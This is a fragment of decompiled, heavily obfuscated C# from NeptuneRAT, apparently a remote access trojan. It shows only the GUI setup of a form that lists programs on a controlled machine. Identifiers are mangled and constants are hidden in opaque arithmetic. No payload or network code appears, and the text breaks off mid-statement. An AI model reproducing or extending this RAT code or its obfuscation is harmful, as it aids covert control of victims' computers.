// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.Programs
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace NeptuneRAT;

[DesignerGenerated]
public class Programs : Form
{
  private IContainer \u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609;
  public Client \u2694️MasonRAT\u270C\u0608؁ڣـ\u060D\u060Aــﻋ؁\u060Eط̨ټژـۭ̍\u060D\u060A;

  public Programs()
  {
    this.Load += new EventHandler(this.\u2694️MasonRAT\u270C\u060Fئ\u060B̍ـ̍ـ\u060Dـــ\u060B\u060Dــ);
    this.\u2694️MasonRAT\u270Cْ\u060A\u060Eـۡڅــ\u060Cـ\u060Aۡ\u060Bڦ\u0608ـ\u060B();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609 == null)
        return;
      this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void \u2694️MasonRAT\u270Cْ\u060A\u060Eـۡڅــ\u060Cـ\u060Aۡ\u060Bڦ\u0608ـ\u060B()
  {
    this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Programs));
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ = new ListView();
    this.\u2694️MasonRAT\u270C\u0609ۜﻼـ\u060Fـ\u060E\u0609\u060Bڼ\u060A\u060Aبـ\u0609\u060Dڼ\u0609 = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cـﮪــط\u060F\u060A\u060Aڟۙـ\u060F\u0608ــ\u0609 = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cڜ\u060Dٻ\u060Aڅ\u060A\u060C\u0608د̍\u060Fﯧ\u060Aــمڜ\u060Aـ\u0020 = new ColumnHeader();
    this.\u2694️MasonRAT\u270C\u060Fــــ\u060Eٽ\u060C̍ــٽ̨ـڅ\u060Ąـۡـ = new ColumnHeader();
    this.\u2694️MasonRAT\u270C\u0608\u060A\u0608ﻻڙـڙـءـټ = new ColumnHeader();
    this.\u2694️MasonRAT\u270C\u060Aﯧﻋدـټ\u060Fۙ\u060A\u060A\u060Aﻋ = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cـؤ\u060Aـ̨ـ\u060Aڙּۙـ\u060D = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cـ\u060D\u060D\u060E\u060A\u0609ۨ\u0608ؤــ\u0608\u0608ۏـ\u060B\u0609 = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cڙڅڛْ\u060A\u060Eڙ\u0609\u060Cﻋ\u0608 = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cﻻــ\u0608ـاـ\u0608ﻻ\u0608\u060F\u0608 = new ColumnHeader();
    this.\u2694️MasonRAT\u270Cـڜ\u0608\u0020\u060Dـۭۙ\u060A\u060F̍ٺ = new ContextMenuStrip(this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609);
    this.\u2694️MasonRAT\u270Cژـڙۛۙۡژـﻻـ\u0608ـ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u0609\u0020̍ــــ\u0608ټ\u0608ــﻋ\u060Aـۧټـ\u0020 = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270C\u060Dـٻۜڝ\u0609ــ\u0608ىحـڦـ = new Timer(this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609);
    this.\u2694️MasonRAT\u270Cـ\u0609\u0608بٺـ\u060Eﯧؤد\u0608\u0608ـټ\u0609 = new Timer(this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609);
    this.\u2694️MasonRAT\u270Cڙٻ\u0608ـــڙـئﮪۙٺ = new Guna2Elipse(this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609 = new Guna2CustomGradientPanel();
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F = new Guna2GroupBox();
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ = new StatusStrip();
    this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B = new ToolStripStatusLabel();
    this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ = new ToolStripStatusLabel();
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ = new Guna2ControlBox();
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ = new Guna2ControlBox();
    this.\u2694️MasonRAT\u270Cٺ\u060Aـ\u060A\u060Dـڜـ\u0608ڕـ\u060B = new Guna2DragControl(this.\u2694️MasonRAT\u270Cڙڞ\u060D̍̍ڞـڝۚ\u060Dـ\u060C\u0608\u0609);
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد = new Guna2ContextMenuStrip();
    this.\u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609 = new ToolStripMenuItem();
    this.\u2694️MasonRAT\u270Cـڜ\u0608\u0020\u060Dـۭۙ\u060A\u060F̍ٺ.SuspendLayout();
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.SuspendLayout();
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.SuspendLayout();
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.SuspendLayout();
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.SuspendLayout();
    this.SuspendLayout();
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.BackColor = Color.FromArgb(((800219704 > 2137802942 ? -1854293742 : 1830505166) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) - (758336179 + (734453474 | 388214760) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, (466233769 + 654550361 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) - (424841644 - -695942437 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, ((685325143 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) > (1128088113 ^ 36243904 % 744755148) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) ? (353119918 > 1382945487 ? 144 /*0x90*/ : 108) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) : -52384665 - -52384746 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.BorderStyle = BorderStyle.None;
    ListView.ColumnHeaderCollection columns = this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Columns;
    ColumnHeader[] values = new ColumnHeader[((-754545465 ^ 1322923569 >> 837667714) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) + (-1628326830 - 1604764239 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0) | (1180196863 > 190024972 ? 508517564 : 678023418) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0];
    values[0] = this.\u2694️MasonRAT\u270C\u0609ۜﻼـ\u060Fـ\u060E\u0609\u060Bڼ\u060A\u060Aبـ\u0609\u060Dڼ\u0609;
    values[1] = this.\u2694️MasonRAT\u270Cـﮪــط\u060F\u060A\u060Aڟۙـ\u060F\u0608ــ\u0609;
    values[((-404794115 ^ 8) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) ^ ~(1947605311 - 1542811191 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0] = this.\u2694️MasonRAT\u270Cڜ\u060Dٻ\u060Aڅ\u060A\u060C\u0608د̍\u060Fﯧ\u060Aــمڜ\u060Aـ\u0020;
    values[(1942109300 ^ (1984877018 | 1057219563)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - (1021189345 - 810569045 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0] = this.\u2694️MasonRAT\u270C\u060Fــــ\u060Eٽ\u060C̍ــٽ̨ـڅ\u060Ąـۡـ;
    values[(-1217257445 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) + (1217257449 - (1179944822 >> 211833374) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) % (797458415 + 804913377 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0] = this.\u2694️MasonRAT\u270C\u0608\u060A\u0608ﻻڙـڙـءـټ;
    values[(2055085334 > 75963253 ? -1970978598 : 1666995832) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) + ((-585855725 ^ ~1199688911) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0 | 1433943776 - (258020671 >> 1757429330) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0] = this.\u2694️MasonRAT\u270C\u060Aﯧﻋدـټ\u060Fۙ\u060A\u060A\u060Aﻋ;
    values[(1 ^ 787220555 - 787220548 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0] = this.\u2694️MasonRAT\u270Cـؤ\u060Aـ̨ـ\u060Aڙּۙـ\u060D;
    values[(((1965060235 << 1705374970) - 423944989 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) > (1774345553 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) ? 1744830422 - (1662752716 | 1693875329) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0 : 1125230325 - 1125230318 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0] = this.\u2694️MasonRAT\u270Cـ\u060D\u060D\u060E\u060A\u0609ۨ\u0608ؤــ\u0608\u0608ۏـ\u060B\u0609;
    values[((-810687937 ^ ~285703757) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0 ^ (585178414 + 1369033351 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) % (2039307919 - 1341824119 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0] = this.\u2694️MasonRAT\u270Cڙڅڛْ\u060A\u060Eڙ\u0609\u060Cﻋ\u0608;
    values[(-2098784574 - 1723149561 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + ~(1860953522 + ~1387920370 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0] = this.\u2694️MasonRAT\u270Cﻻــ\u0608ـاـ\u0608ﻻ\u0608\u060F\u0608;
    columns.AddRange(values);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.ContextMenuStrip = (ContextMenuStrip) this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Cursor = Cursors.Default;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Dock = (DockStyle) ((1921346259 + ~1876787867 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) > 124746886 + (162919416 | 91882793) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) ? 1778848977 - 1778848971 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1 : (741205373 > 2029939486 ? 6 : 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2715), 9.75f);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.FullRowSelect = true;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.HideSelection = false;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Location = new Point(0, 40);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2716);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.Size = new Size((1114221312 % 746683978 - 358981454 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) - (1232624244 - (138773938 | 1224067735) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 348);
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.TabIndex = ((1316142960 > 819449481 ? 3 : 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) - ((135050152 ^ 852600591 << 848329420) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 412537859 + 1455227931 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.UseCompatibleStateImageBehavior = false;
    this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ.View = View.Details;
    this.\u2694️MasonRAT\u270C\u0609ۜﻼـ\u060Fـ\u060E\u0609\u060Bڼ\u060A\u060Aبـ\u0609\u060Dڼ\u0609.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2717);
    this.\u2694️MasonRAT\u270C\u0609ۜﻼـ\u060Fـ\u060E\u0609\u060Bڼ\u060A\u060Aبـ\u0609\u060Dڼ\u0609.Width = ((963962209 > 1073092458 ? -1975756470 : 1739408120) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) - ((1739408036 ^ 690263351 >> 1267324760) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0;
    this.\u2694️MasonRAT\u270Cـﮪــط\u060F\u060A\u060Aڟۙـ\u060F\u0608ــ\u0609.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2718);
    this.\u2694️MasonRAT\u270Cـﮪــط\u060F\u060A\u060Aڟۙـ\u060F\u0608ــ\u0609.Width = ((-1902205054 ^ -1051590592) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) > 428023494 - 1283166 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ? -605648354 - -605648471 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) : (90692646 > 1795499987 ? 208 /*0xD0*/ : 156) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) + 